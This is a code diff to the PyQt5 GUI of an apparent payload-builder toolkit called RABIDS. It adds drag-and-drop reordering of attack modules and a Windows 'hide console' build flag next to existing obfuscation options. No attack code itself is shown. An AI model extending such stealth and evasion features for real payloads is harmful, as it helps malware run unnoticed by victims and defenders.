@@ -1,5 +1,6 @@
 import sys
 import os
+from functools import partial
 import shlex
 import subprocess
 from pathlib import Path
@@ -7,7 +8,7 @@ import tempfile
 from PyQt5.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
     QPushButton, QLineEdit, QComboBox, QCheckBox, QTextEdit, QLabel, QGroupBox,
-    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, QListWidget, QScrollArea,
+    QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, QFileDialog, QListWidget, QScrollArea, QAbstractItemView,
     QListWidgetItem, QSizePolicy
 )
 from PyQt5.QtGui import QFont, QPixmap, QMovie
@@ -106,6 +107,38 @@ class BuildThread(QThread):
             self.log_signal.emit(f"An unexpected error occurred during build: {e}", "error")
             self.finished_signal.emit(-1)
 
+
+class ModuleTableWidget(QTableWidget):
+    """A QTableWidget that supports drag-and-drop row reordering."""
+    reorder_signal = pyqtSignal(list)
+
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.setDragDropMode(QAbstractItemView.InternalMove)
+        self.setSelectionBehavior(QAbstractItemView.SelectRows)
+        self.setSelectionMode(QAbstractItemView.SingleSelection)
+
+    def dropEvent(self, event):
+        if event.source() == self and (event.dropAction() == Qt.MoveAction or self.dragDropMode() == QAbstractItemView.InternalMove):
+            source_row = self.selectionModel().currentIndex().row()
+            dest_row = self.indexAt(event.pos()).row()
+            if dest_row == -1:
+                dest_row = self.rowCount() -1
+
+            current_order = []
+            for row in range(self.rowCount()):
+                item = self.item(row, 0)
+                if item and item.data(Qt.UserRole):
+                    current_order.append(item.data(Qt.UserRole))
+            
+            moved_item = current_order.pop(source_row)
+            current_order.insert(dest_row, moved_item)
+
+            self.reorder_signal.emit(current_order)
+            event.accept()
+            event.setDropAction(Qt.IgnoreAction)
+        else:
+            super().dropEvent(event)
 
 class RABIDSGUI(QMainWindow):
     def __init__(self):
@@ -212,14 +245,18 @@ class RABIDSGUI(QMainWindow):
         left_layout.addWidget(self.module_options_group, stretch=7)
 
         options_row1 = QHBoxLayout()
+        self.hide_console_check = QCheckBox("HIDE CONSOLE")
+        self.hide_console_check.setFont(subtitle_font)
+        self.hide_console_check.setChecked(True)
         self.obfuscate_check = QCheckBox("OBFUSCATE")
         self.obfuscate_check.setFont(subtitle_font)
         self.obfuscate_check.setChecked(False)
         self.obfuscate_check.stateChanged.connect(self.toggle_obfuscation)
         self.ollvm_input = QLineEdit("")
         self.ollvm_input.setFont(subtitle_font)
+        options_row1.addWidget(self.hide_console_check)
         options_row1.addWidget(self.obfuscate_check)
-        options_row1.addWidget(self.ollvm_input)
+        options_row1.addWidget(self.ollvm_input, 1)
         left_layout.addLayout(options_row1)
 
         options_row2 = QHBoxLayout()
@@ -235,7 +272,7 @@ class RABIDSGUI(QMainWindow):
         self.target_os_combo = QComboBox()
         self.target_os_combo.addItems(["windows", "linux", "macos"])
         self.target_os_combo.setFont(subtitle_font)
-        self.target_os_combo.currentTextChanged.connect(self.update_obfuscation_for_os)
+        self.target_os_combo.currentTextChanged.connect(self.update_windows_only_options)
         options_row2.addWidget(target_os_label)
         options_row2.addWidget(self.target_os_combo, 1)
 
@@ -286,11 +323,17 @@ class RABIDSGUI(QMainWindow):
         self.module_combo.currentTextChanged.connect(self.update_module_description)
         self.module_combo.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
         module_select_layout.addWidget(self.module_combo)
+
+        module_buttons_layout = QHBoxLayout()
         self.add_module_btn = QPushButton("ADD MODULE")
         self.add_module_btn.setFont(subtitle_font)
         self.add_module_btn.clicked.connect(self.add_module)
-        self.add_module_btn.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
-        module_select_layout.addWidget(self.add_module_btn)
+        module_buttons_layout.addWidget(self.add_module_btn)
+        self.show_all_options_btn = QPushButton("SHOW ALL OPTIONS")
+        self.show_all_options_btn.setFont(subtitle_font)
+        self.show_all_options_btn.clicked.connect(self.show_all_options)
+        module_buttons_layout.addWidget(self.show_all_options_btn)
+        module_select_layout.addLayout(module_buttons_layout)
         right_layout.addLayout(module_select_layout)
         self.module_desc_label = QLabel("Select a module to view its description")
         self.module_desc_label.setFont(subtitle_font)
@@ -303,17 +346,16 @@ class RABIDSGUI(QMainWindow):
         module_chain_label = QLabel("MODULE CHAIN")
         module_chain_label.setFont(title_font)
         right_layout.addWidget(module_chain_label)
-        self.module_table = QTableWidget()
+        self.module_table = ModuleTableWidget()
         self.module_table.setFont(subtitle_font)
-        self.module_table.setColumnCount(4)
-        self.module_table.setHorizontalHeaderLabels(["Module", "", "", ""])
+        self.module_table.setColumnCount(2)
+        self.module_table.setHorizontalHeaderLabels(["Module", ""])
         self.module_table.horizontalHeader().setSectionResizeMode(0, QHeaderView.Stretch)
         self.module_table.setColumnWidth(1, 50)
-        self.module_table.setColumnWidth(2, 50)
-        self.module_table.setColumnWidth(3, 50)
         self.module_table.setStyleSheet("background-color: #111113;")
-        self.module_table.cellClicked.connect(self.on_module_clicked)
+        self.module_table.reorder_signal.connect(self.reorder_modules)
         right_layout.addWidget(self.module_table)
+        self.module_table.itemClicked.connect(self.on_module_item_clicked)
 
         builder_layout.addLayout(right_layout, 4)
 
@@ -569,9 +611,9 @@ class RABIDSGUI(QMainWindow):
         self.tab_widget.addTab(docs_widget, "DOCUMENTATION")
         self.update_loot_folder_view()
         self.update_module_description("SELECT MODULE")
-        self.update_module_table()
+        self.update_module_table() 
         self.update_options_layout()
-        self.update_obfuscation_for_os(self.target_os_combo.currentText())
+        self.update_windows_only_options(self.target_os_combo.currentText())
 
     def on_tab_changed(self, index):
         if self.tab_widget.tabText(index) == "OUTPUT":
@@ -723,55 +765,45 @@ class RABIDSGUI(QMainWindow):
             self.update_module_table()
             self.update_options_layout()
 
-    def remove_module(self, row):
-        if 0 <= row < len(self.selected_modules):
-            module_name = os.path.basename(self.selected_modules[row])
-            self.selected_modules.pop(row)
-            self.log_message(f"Removed module: {module_name}", "success")
+    def remove_module(self, module_to_remove):
+        """Removes a module from the selected_modules list by its full path."""
+        if module_to_remove in self.selected_modules:
+            self.selected_modules.remove(module_to_remove)
+            module_name = os.path.basename(module_to_remove)
+            self.log_message(f"Removed module: {module_name}", "system")
             self.update_module_table()
             self.update_options_layout()
 
-    def on_module_clicked(self, row, column):
-        if 0 <= row < len(self.selected_modules):
-            self.update_options_layout()
+    def show_all_options(self):
+        """Updates the options view to show options for all selected modules."""
+        self.update_options_layout()
 
-    def move_module_up(self, row):
-        if row > 0:
-            self.selected_modules[row], self.selected_modules[row - 1] = self.selected_modules[row - 1], self.selected_modules[row]
-            self.update_module_table()
-            self.update_options_layout()
+    def on_module_item_clicked(self, item):
+        """When a module in the chain is clicked, show its specific options."""
+        self.update_options_layout(focused_module=item.data(Qt.UserRole))
 
-    def move_module_down(self, row):
-        if row < len(self.selected_modules) - 1:
-            self.selected_modules[row], self.selected_modules[row + 1] = self.selected_modules[row + 1], self.selected_modules[row]
-            self.update_module_table()
-            self.update_options_layout()
-
+    def reorder_modules(self, new_order):
+        # This check prevents re-updating if the order hasn't actually changed.
+        if self.selected_modules == new_order:
+            return
+        self.log_message("Module chain reordered.", "system")
+        self.selected_modules = new_order
+        self.update_module_table() # Re-draw to fix button connections
+ 
     def update_module_table(self):
         self.module_table.setRowCount(len(self.selected_modules))
         for i, module in enumerate(self.selected_modules):
             module_name = module.split('/')[-1]
             name_item = QTableWidgetItem(module_name) 
             name_item.setFont(QFont("Arial", 10))
+            name_item.setData(Qt.UserRole, module) # Store full module path
             name_item.setTextAlignment(Qt.AlignLeft | Qt.AlignVCenter)
             self.module_table.setItem(i, 0, name_item)
 
-            up_btn = QPushButton("↑")
-            up_btn.setFont(QFont("Arial", 8))
-            up_btn.clicked.connect(lambda _, r=i: self.move_module_up(r))
-            up_btn.setEnabled(i > 0)
-            self.module_table.setCellWidget(i, 1, up_btn)
-
-            down_btn = QPushButton("↓")
-            down_btn.setFont(QFont("Arial", 8))
-            down_btn.clicked.connect(lambda _, r=i: self.move_module_down(r))
-            down_btn.setEnabled(i < len(self.selected_modules) - 1)
-            self.module_table.setCellWidget(i, 2, down_btn)
-
             remove_btn = QPushButton("X")
             remove_btn.setFont(QFont("Arial", 8))
-            remove_btn.clicked.connect(lambda _, r=i: self.remove_module(r))
-            self.module_table.setCellWidget(i, 3, remove_btn)
+            remove_btn.clicked.connect(partial(self.remove_module, module))
+            self.module_table.setCellWidget(i, 1, remove_btn)
 
         for i in range(self.module_table.rowCount()):
             self.module_table.setRowHeight(i, 30)
@@ -779,14 +811,17 @@ class RABIDSGUI(QMainWindow):
     def toggle_obfuscation(self):
         self.ollvm_input.setEnabled(self.obfuscate_check.isChecked())
 
-    def update_obfuscation_for_os(self, os_name):
+    def update_windows_only_options(self, os_name):
         if os_name in ("linux", "macos"):
+            self.hide_console_check.setEnabled(False)
             self.obfuscate_check.setEnabled(False)
             self.obfuscate_check.setChecked(False)
             self.ollvm_input.setEnabled(False)
         else:
+            self.hide_console_check.setEnabled(True)
             self.obfuscate_check.setEnabled(True)
             self.toggle_obfuscation()
+
 
     def show_loading_view(self):
         for i in reversed(range(self.options_layout.count())):
@@ -931,6 +966,9 @@ class RABIDSGUI(QMainWindow):
             cmd.append("--obfuscate")
             if self.ollvm_input.text():
                 cmd.extend(["--ollvm"] + self.ollvm_input.text().split())
+
+        if self.hide_console_check.isChecked() and self.target_os_combo.currentText() == "windows":
+            cmd.append("--hide-console")
 
         cmd.extend(options)
         self.module_options_group.setTitle("BUILDING PAYLOAD...")
